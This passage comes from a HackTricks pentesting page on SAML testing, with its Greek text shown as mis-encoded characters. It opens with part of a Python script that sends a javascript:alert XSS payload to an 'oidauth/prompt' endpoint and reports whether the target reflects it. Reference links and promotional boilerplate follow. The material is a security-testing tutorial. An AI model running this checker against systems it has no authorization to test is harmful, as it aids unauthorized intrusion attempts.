url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
